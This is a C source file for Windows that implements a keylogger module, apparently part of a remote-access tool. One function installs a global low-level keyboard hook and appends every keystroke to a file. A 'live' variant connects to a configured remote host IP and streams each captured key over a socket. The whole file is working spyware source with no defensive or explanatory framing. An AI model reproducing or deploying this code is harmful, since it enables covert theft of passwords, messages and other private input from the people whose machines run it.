#include <stdio.h>
#include <windows.h>

#include "main.h"
#include "capture.h"
#include "cry_socket.h"

#include "shell_obf.h"

// keylogger - write to file
static DWORD keylog_id;
static HHOOK keylog_hook;
static FILE* gl_file = NULL;
static BOOL keylog_running = FALSE;
static BOOL keylog_clean = TRUE;
static LRESULT __stdcall keylog_callback(int nCode, WPARAM wParam, LPARAM lParam) {
	
	if(nCode == HC_ACTION) {
		KBDLLHOOKSTRUCT* k = (KBDLLHOOKSTRUCT*)lParam;
		const char* c = CaptureKeyPress(k->vkCode, k->flags, keylog_clean);
		if (c != NULL) {
			fprintf(gl_file, c);
			fflush(gl_file);
		}
	}
    return CallNextHookEx(keylog_hook, nCode, wParam, lParam);
}
static DWORD WINAPI keylog_thread(void* data) {
	
	DPL("keylog start");
	
	if (keylog_running) { free(data); return 0; }
	keylog_running = TRUE;
	keylog_id = GetCurrentThreadId();
	
	char* filePath_ = (char*)data;
	int fl = strlen(filePath_);
	char filePath[fl];
	memset(filePath, 0, fl);
	strcpy(filePath, filePath_);
	free(filePath_);
	
	// set hook
	if (!(keylog_hook = SetWindowsHookEx(WH_KEYBOARD_LL, keylog_callback, NULL, 0))) {
		keylog_running = FALSE;
		return 0;
	}
	
	gl_file = fopen(filePath, "a");
	if (!gl_file) {
		DPL("keylog failed to open file");
		keylog_running = FALSE;
		return 0;
	}
	
    MSG msg;
	BOOL bRet;
	while((bRet = GetMessage(&msg, NULL, 0, 0)) != 0) {
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
	
	fclose(gl_file);
	UnhookWindowsHookEx(keylog_hook);
	keylog_running = FALSE;
	
	DPL("keylog end");
    return 1;
}
HANDLE keylog_init(const char* fileName) {
	char* file = strdup(fileName);
	return CreateThread(NULL, 0, keylog_thread, (void*)file, 0, NULL);
}
BOOL keylog_stop() { return PostThreadMessage(keylog_id, WM_QUIT, 0, 0); }
BOOL keylog_clean_get() { return keylog_clean; }
BOOL keylog_clean_set(BOOL value) { keylog_clean = value; return keylog_clean; }

// live keylogger - stream the keys
static DWORD livekeylog_id;
static HHOOK livekeylog_hook;
static SOCKET livekeylog_sock = INVALID_SOCKET;
static BOOL livekeylog_running = FALSE;
static BOOL livekeylog_clean = TRUE;
static DWORD WINAPI livekeylog_disconnect() {
	
	// wait until disconnect
	while (TRUE) {
		int r = recvE(livekeylog_sock, NULL, 0, 0);
		if (r == SOCKET_ERROR || r == 0) { break; }
	}
	PostThreadMessage(livekeylog_id, WM_QUIT, 0, 0); // stop
	return 1;
}
static LRESULT __stdcall livekeylog_callback(int nCode, WPARAM wParam, LPARAM lParam) {
	
	if(nCode == HC_ACTION) {
		KBDLLHOOKSTRUCT* k = (KBDLLHOOKSTRUCT*)lParam;
		const char* c = CaptureKeyPress(k->vkCode, k->flags, livekeylog_clean);
		if (c != NULL) {
			char msg[SMALLSIZ] = {0};
			sprintf(msg, "%s", c);
			int s = sendE(livekeylog_sock, msg, strlen(msg), 0);
			if (s == SOCKET_ERROR) { PostQuitMessage(0); }
		}
	}
    return CallNextHookEx(livekeylog_hook, nCode, wParam, lParam);
}
static DWORD WINAPI livekeylog_thread() {
	
	DPL("livekeylog - begin");
	
	if (livekeylog_running) { DPL("livekeylog - running already"); return 0; }
	DPL("livekeylog - begin2");
	livekeylog_running = TRUE;
	livekeylog_id = GetCurrentThreadId();
	
	livekeylog_sock = socket(AF_INET, SOCK_STREAM, 0);
	if (livekeylog_sock == INVALID_SOCKET) {
		DPL("livekeylog - socket -> INVALID_SOCKET");
		livekeylog_running = FALSE;
		return 0;
	}
	
	struct sockaddr_in addr;
	memset(&addr, 0, sizeof(addr)); // can use ZeroMemory
	addr.sin_family = AF_INET;
	addr.sin_addr.s_addr = inet_addr(SHELL_STRING_HOST_IP);
	addr.sin_port = htons(HOST_PORT_KEYLOG);
	
	DPL("livekeylog - connecting...");
	if (connect(livekeylog_sock, (SOCKADDR*)&addr, sizeof(addr)) == SOCKET_ERROR) {
		DPL("livekeylog - failed to connect");
		closesocket(livekeylog_sock);
		livekeylog_running = FALSE;
		return 0;
	}
	DPL("livekeylog - connected");
	
	HANDLE thread = CreateThread(NULL, 0, livekeylog_disconnect, NULL, 0, NULL);
	
	// set hook
	if (!(livekeylog_hook = SetWindowsHookEx(WH_KEYBOARD_LL, livekeylog_callback, NULL, 0))) {
		DPL("livekeylog - failed to install hook");
		closesocket(livekeylog_sock);
		livekeylog_running = FALSE;
		return 0;
	}
	
	MSG msg;
	BOOL bRet;
	while((bRet = GetMessage(&msg, NULL, 0, 0)) != 0) {
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
	
	if (!thread) { TerminateThread(livekeylog_disconnect, 0); }
	UnhookWindowsHookEx(livekeylog_hook);
	closesocket(livekeylog_sock);
	livekeylog_running = FALSE;
	
	DPL("livekeylog - end");
	
	return 1;
}
HANDLE livekeylog_init() { return CreateThread(NULL, 0, livekeylog_thread, NULL, 0, NULL); }
BOOL livekeylog_stop() { return PostThreadMessage(livekeylog_id, WM_QUIT, 0, 0); }
BOOL livekeylog_clean_get() { return livekeylog_clean; }
BOOL livekeylog_clean_set(BOOL value) { livekeylog_clean = value; return livekeylog_clean; }